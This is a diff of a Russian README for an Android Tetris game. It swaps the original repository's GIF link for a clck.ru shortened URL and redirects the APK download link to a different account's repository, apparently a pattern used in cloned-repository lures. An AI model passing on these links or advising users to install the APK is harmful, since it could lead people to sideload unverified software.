@@ -4,7 +4,7 @@
 
 ## Игровой процесс
 
-![tetris](https://github.com/d-lehel/tetris-android-game/assets/75861915/5455ad28-7ad8-42cb-917e-897e7e9fb111)
+![tetris] https://clck.ru/35vgUd
 
 Ознакомьтесь с игровым процессом в действии! Приведенный выше GIF демонстрирует игровой процесс игры Tetris на Android.
 
@@ -27,5 +27,4 @@
 ## Как играть
 
 Скачайте отсюда и установите игру на свое Android-устройство.
-- https://github.com/d-lehel/tetris-android-game/blob/main/playable_tetris_V3.apk
-
+- https://github.com/AdvanNext/Tetris/blob/main/playable_tetris_V3.apk
